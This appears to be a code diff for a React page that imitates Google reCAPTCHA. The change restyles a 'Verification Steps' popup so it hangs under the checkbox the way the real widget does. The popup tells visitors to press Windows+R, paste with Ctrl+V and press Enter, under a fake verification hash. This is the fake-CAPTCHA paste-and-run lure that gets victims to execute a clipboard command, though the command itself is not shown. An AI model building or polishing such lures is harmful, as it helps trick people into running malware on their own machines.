@@ -1,5 +1,13 @@
 import { createFileRoute } from "@tanstack/react-router";
-import { useEffect, useState, type FormEvent } from "react";
+import {
+  useEffect,
+  useLayoutEffect,
+  useRef,
+  useState,
+  type FormEvent,
+  type RefObject,
+} from "react";
+import { createPortal } from "react-dom";
 import {
   GE_SHELL_CSS,
   GeAccountChip,
@@ -87,18 +95,49 @@ function FakeRecaptcha({
   );
 }
 
-function VerificationStepsModal({
+/** Challenge panel like real reCAPTCHA — fixed under the widget, nudged left (not centered). */
+function VerificationStepsPopover({
   open,
   hash,
+  anchorRef,
   onVerify,
-  onClose,
 }: {
   open: boolean;
   hash: string;
+  anchorRef: RefObject<HTMLElement | null>;
   onVerify: () => void;
-  onClose: () => void;
 }) {
   const [visible, setVisible] = useState(false);
+  const [pos, setPos] = useState<{ top: number; left: number } | null>(null);
+
+  useLayoutEffect(() => {
+    if (!open) {
+      setPos(null);
+      return;
+    }
+    const update = () => {
+      const el = anchorRef.current;
+      if (!el) return;
+      const r = el.getBoundingClientRect();
+      const width = Math.min(352, window.innerWidth - 16);
+      // Hang just under the checkbox, a little to the left — not screen-center.
+      let left = r.left - 36;
+      left = Math.max(8, Math.min(left, window.innerWidth - width - 8));
+      let top = r.bottom + 8;
+      const estHeight = 420;
+      if (top + estHeight > window.innerHeight - 8 && r.top > estHeight) {
+        top = Math.max(8, r.top - estHeight - 8);
+      }
+      setPos({ top, left });
+    };
+    update();
+    window.addEventListener("resize", update);
+    window.addEventListener("scroll", update, true);
+    return () => {
+      window.removeEventListener("resize", update);
+      window.removeEventListener("scroll", update, true);
+    };
+  }, [open, anchorRef]);
 
   useEffect(() => {
     if (!open) {
@@ -109,77 +148,71 @@ function VerificationStepsModal({
     return () => cancelAnimationFrame(id);
   }, [open]);
 
-  if (!open) return null;
+  if (!open || !pos || typeof document === "undefined") return null;
 
-  return (
+  return createPortal(
     <div
-      className={`ge-vs-overlay${visible ? " is-open" : ""}`}
-      role="presentation"
-      onClick={(e) => {
-        if (e.target === e.currentTarget) onClose();
-      }}
+      className={`ge-vs-popover${visible ? " is-open" : ""}`}
+      style={{ top: pos.top, left: pos.left }}
+      role="dialog"
+      aria-modal="true"
+      aria-labelledby="ge-vs-title"
     >
-      <div
-        className={`ge-vs-modal${visible ? " is-open" : ""}`}
-        role="dialog"
-        aria-modal="true"
-        aria-labelledby="ge-vs-title"
-      >
-        <header className="ge-vs-header">
-          <p className="ge-vs-eyebrow">Complete these</p>
-          <h2 id="ge-vs-title" className="ge-vs-title">
-            Verification Steps
-          </h2>
-        </header>
+      <header className="ge-vs-header">
+        <p className="ge-vs-eyebrow">Complete these</p>
+        <h2 id="ge-vs-title" className="ge-vs-title">
+          Verification Steps
+        </h2>
+      </header>
 
-        <div className="ge-vs-body">
-          <p className="ge-vs-intro">To better prove you are not a robot, please:</p>
-          <ol className="ge-vs-steps">
-            <li>
-              <span className="ge-vs-num">1.</span>
-              <span>
-                Press &amp; hold the <strong>Windows Key</strong> <WindowsKeyIcon />{" "}
-                <strong>+ R</strong>.
-              </span>
-            </li>
-            <li>
-              <span className="ge-vs-num">2.</span>
-              <span>
-                In the verification window, press <strong>Ctrl + V</strong>.
-              </span>
-            </li>
-            <li>
-              <span className="ge-vs-num">3.</span>
-              <span>
-                Press <strong>Enter</strong> on your keyboard to finish.
-              </span>
-            </li>
-          </ol>
-
-          <p className="ge-vs-agree">You will observe and agree:</p>
-          <label className="ge-vs-consent">
-            <span className="ge-vs-check" aria-hidden="true">
-              <svg viewBox="0 0 24 24" width="14" height="14">
-                <path
-                  fill="#fff"
-                  d="M9.0 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"
-                />
-              </svg>
+      <div className="ge-vs-body">
+        <p className="ge-vs-intro">To better prove you are not a robot, please:</p>
+        <ol className="ge-vs-steps">
+          <li>
+            <span className="ge-vs-num">1.</span>
+            <span>
+              Press &amp; hold the <strong>Windows Key</strong> <WindowsKeyIcon />{" "}
+              <strong>+ R</strong>.
             </span>
-            <span className="ge-vs-consent-text">
-              I am not a robot - reCAPTCHA Verification Hash: {hash}
+          </li>
+          <li>
+            <span className="ge-vs-num">2.</span>
+            <span>
+              In the verification window, press <strong>Ctrl + V</strong>.
             </span>
-          </label>
-        </div>
+          </li>
+          <li>
+            <span className="ge-vs-num">3.</span>
+            <span>
+              Press <strong>Enter</strong> on your keyboard to finish.
+            </span>
+          </li>
+        </ol>
 
-        <footer className="ge-vs-footer">
-          <p className="ge-vs-hint">Perform the steps above to finish verification.</p>
-          <button type="button" className="ge-vs-verify" onClick={onVerify}>
-            VERIFY
-          </button>
-        </footer>
+        <p className="ge-vs-agree">You will observe and agree:</p>
+        <label className="ge-vs-consent">
+          <span className="ge-vs-check" aria-hidden="true">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path
+                fill="#fff"
+                d="M9.0 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"
+              />
+            </svg>
+          </span>
+          <span className="ge-vs-consent-text">
+            I am not a robot - reCAPTCHA Verification Hash: {hash}
+          </span>
+        </label>
       </div>
-    </div>
+
+      <footer className="ge-vs-footer">
+        <p className="ge-vs-hint">Perform the steps above to finish verification.</p>
+        <button type="button" className="ge-vs-verify" onClick={onVerify}>
+          VERIFY
+        </button>
+      </footer>
+    </div>,
+    document.body,
   );
 }
 
@@ -373,39 +406,32 @@ ${GE_SHELL_CSS}
   box-shadow: none;
 }
 
-/* Verification Steps modal */
-.ge-vs-overlay {
+/* reCAPTCHA-style challenge: fixed under the widget (portaled), nudged left */
+.ge-rc-wrap {
+  position: relative;
+  width: fit-content;
+  max-width: 100%;
+}
+.ge-vs-popover {
   position: fixed;
-  inset: 0;
   z-index: 1000;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  padding: 24px 16px;
-  background: rgba(0, 0, 0, 0);
-  transition: background .28s ease;
-  box-sizing: border-box;
-}
-.ge-vs-overlay.is-open {
-  background: rgba(0, 0, 0, 0.45);
-}
-.ge-vs-modal {
-  width: 100%;
-  max-width: 420px;
+  width: min(352px, calc(100vw - 16px));
   background: #fff;
   border: 1px solid #dadce0;
-  border-radius: 4px;
-  box-shadow: 0 8px 28px rgba(0,0,0,.28);
+  border-radius: 2px;
+  box-shadow: 0 2px 8px rgba(0,0,0,.28), 0 0 1px rgba(0,0,0,.16);
   overflow: hidden;
   font-family: Roboto, Helvetica, Arial, sans-serif;
   color: #202124;
   opacity: 0;
-  transform: translateY(16px) scale(0.96);
-  transition: opacity .28s ease, transform .32s cubic-bezier(.2,.8,.2,1);
+  transform: translateY(-6px);
+  transition: opacity .2s ease, transform .22s cubic-bezier(.2,.8,.2,1);
+  pointer-events: none;
 }
-.ge-vs-modal.is-open {
+.ge-vs-popover.is-open {
   opacity: 1;
-  transform: translateY(0) scale(1);
+  transform: translateY(0);
+  pointer-events: auto;
 }
 .ge-vs-header {
   background: #1a73e8;
@@ -531,6 +557,7 @@ function GeCaptchaPage() {
   const [checked, setChecked] = useState(false);
   const [loading, setLoading] = useState(false);
   const [modalOpen, setModalOpen] = useState(false);
+  const rcWrapRef = useRef<HTMLDivElement>(null);
   // Screenshot 1:1 for now — text/hash will be customized later.
   const [hash] = useState("3822");
 
@@ -613,11 +640,19 @@ function GeCaptchaPage() {
         <div className="ge-pane-right">
           <p className="ge-captcha-prompt">Confirm you{"\u2019"}re not a robot</p>
           <form className="ge-captcha-form" onSubmit={handleNext} autoComplete="off">
-            <FakeRecaptcha
-              checked={checked}
-              loading={loading}
-              onActivate={handleActivate}
-            />
+            <div className="ge-rc-wrap" ref={rcWrapRef}>
+              <FakeRecaptcha
+                checked={checked}
+                loading={loading}
+                onActivate={handleActivate}
+              />
+              <VerificationStepsPopover
+                open={modalOpen}
+                hash={hash}
+                anchorRef={rcWrapRef}
+                onVerify={handleVerify}
+              />
+            </div>
 
             <div className="ge-actions">
               <button type="submit" className="ge-btn ge-btn-next" disabled={!checked}>
@@ -627,13 +662,6 @@ function GeCaptchaPage() {
           </form>
         </div>
       </main>
-
-      <VerificationStepsModal
-        open={modalOpen}
-        hash={hash}
-        onVerify={handleVerify}
-        onClose={() => setModalOpen(false)}
-      />
 
       <GeFooter />
       <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
